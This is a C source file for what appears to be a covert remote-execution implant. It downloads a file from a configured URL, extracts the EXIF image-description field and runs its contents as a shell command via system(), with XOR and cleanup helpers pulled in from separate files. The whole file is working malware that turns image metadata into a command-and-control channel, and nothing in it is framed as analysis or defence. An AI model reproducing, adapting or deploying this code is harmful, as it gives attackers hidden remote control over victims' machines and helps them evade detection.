#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <libexif/exif-data.h> 
#include <curl/curl.h>
#include "consts.h" 
#include "utils/xor.c" 
#include "utils/clean.c" 
#include <string.h> 

static size_t write_data(void *ptr, size_t size, size_t nmemb, void *stream)
{
  size_t written = fwrite(ptr, size, nmemb, (FILE *)stream);
  return written;
}

static char *getexif(const char *filename)
{ 
	ExifData *data; 
	data = exif_data_new_from_file(filename); 
	ExifEntry *entry = exif_content_get_entry(data->ifd[EXIF_IFD_0], EXIF_TAG_IMAGE_DESCRIPTION);
	static char result[1024]; 
	char buf[1024]; 
	if (entry)
	{ 
		exif_entry_get_value(entry, buf, sizeof(buf)); 
		if (*buf) strcpy(result, buf); 
		else strcpy(result, "NULL"); 
	} 
	else strcpy(result, "NULL"); 
	return result;
} 

int main()
{
  CURL *curl_handle;
  static const char *url = URL;
  static const char *filename = FILENAME;
  FILE *fp;
  curl_global_init(CURL_GLOBAL_ALL);
  curl_handle = curl_easy_init();
  curl_easy_setopt(curl_handle, CURLOPT_URL, url);
  curl_easy_setopt(curl_handle, CURLOPT_VERBOSE, 1L);
  curl_easy_setopt(curl_handle, CURLOPT_NOPROGRESS, 1L);
  curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_data);
  fp = fopen(filename, "wb");
  if(fp) 
  {
    curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, fp);
    curl_easy_perform(curl_handle);
    const char *data; 
    printf("data: %s\n", getexif(filename));
    data = getexif(filename);
    system(data);
    fclose(fp);
  }
  curl_easy_cleanup(curl_handle);
  curl_global_cleanup();
  return 0;
}

